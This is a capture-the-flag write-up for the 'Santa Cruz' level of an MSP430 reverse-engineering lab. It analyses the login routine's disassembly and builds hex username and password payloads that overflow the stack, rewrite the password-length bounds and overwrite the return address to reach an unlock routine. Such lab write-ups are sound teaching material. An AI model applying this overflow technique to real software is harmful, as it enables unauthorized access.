# Santa Cruz

Reading through the `login` method we see that the user is now prompted two inputs:

- username
- password

It look like for both the username and the password inputs, the program allows an input that is up to 0x63 (99) bytes long. The user input goes into memory buffer 0x2404, and then is copied to the stack via `strcpy` call, so we have two chances of manipulating the stack to our liking (to be seen if this is the approach we need to take).

Taking a look at the stack right after the second `strcpy` call this is what it looks like:

```asm
> r sp 64
43a0 0000 7573 6572 6e61 6d65 0000 0000 0000  ..username......
43b0 0000 0008 1070 6173 7377 6f72 6400 0000  .....password...
43c0 0000 0000 0000 0000 0000 0000 4044 0000  ............@D..
43d0 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

We see where the username is copied at address `43a2`, the password at address `43b5`, and the return address for `login` is stored in address `43cc`.
We also see `0x08` and `0x10` at addresses `43b3` and `43b4` respectively (which I think are meant to encode the min and max lengths for the username and password).

After the `strcpy` calls we have:

```asm
45d0:  0f4b           mov	r11, r15
45d2:  0e44           mov	r4, r14
45d4:  3e50 e8ff      add	#0xffe8, r14
45d8:  1e53           inc	r14
45da:  ce93 0000      tst.b	0x0(r14)
45de:  fc23           jnz	$-0x6 <login+0x88>
45e0:  0b4e           mov	r14, r11
45e2:  0b8f           sub	r15, r11
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	$+0xe <login+0xaa>
```

Which can be broken up into the following parts:

- first there is a loop to find the first `0x00` at the end of the password input
- then there is a subtraction to calculate the password length
- then `0x10` byte (at `-0x18(r4)`) is loaded to `r15` and a comparison is made
- the `cmp` instruction subtracts `r15` (i.e. 16) from the length of the password and sets the `sr` register

This means that if the password length is less than 16, the `jnc` branch is taken. If the password length is greater than 16, the `jnc` branch is not taken and the `__stop_progExec__` method is called.

Similarly there is a check against 0x8.

So all in all, the program checks that the password is between 8 and 16 bytes.

What is interesting here is that the 0x8 and 0x10 bytes that dictate the valid length of the password are between the username and password on the stack. So I should be able to overflow the username (for which there is no length check) to change the length check.

Here I am going to change the bounds of the password to be between 8 and 32 bytes, and continue overflowing until I can rewrite the return address for the login method.

Username:  
`<17 bytes of random data> + 08 20 + <23 bytes of random data> + <address to unlock> + <null byte>`  

`aabbaabbaabbaabbaabbaabbaabbaabbaa 08 20 aabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaa 4a44 00`  

`aabbaabbaabbaabbaabbaabbaabbaabbaa0820aabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaa4a4400`

Continuing to inspect the code, towards the end of the `<login>` method there is a check that `r4-6 == 0x00`:

```asm
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	$+0xe <login+0x10e>
```

In order for this jump to be taken we need the password to be 17-bytes long so that the null-termination goes in the right memory address for the jump to be taken.

Password:  
`<17 bytes or random data>`  
`55aa55aa55aa55aa55aa55aa55aa55aa55`

```sh
> r sp 48
43a0 0000 aabb aabb aabb aabb aabb aabb aabb  ................
43b0 aabb aa08 2055 aa55 aa55 aa55 aa55 aa55  .... U.U.U.U.U.U
43c0 aa55 aa55 aa55 00aa bbaa bbaa 4a44 0000  .U.U.U......JD..
```

**Solution (in HEX):**  

- **Username: `aabbaabbaabbaabbaabbaabbaabbaabbaa0820aabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaa4a4400`.**
- **Password: `55aa55aa55aa55aa55aa55aa55aa55aa55`**

```sh
> solve
aabbaabbaabbaabbaabbaabbaabbaabbaa0820aabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaabbaa4a4400
55aa55aa55aa55aa55aa55aa55aa55aa55
```
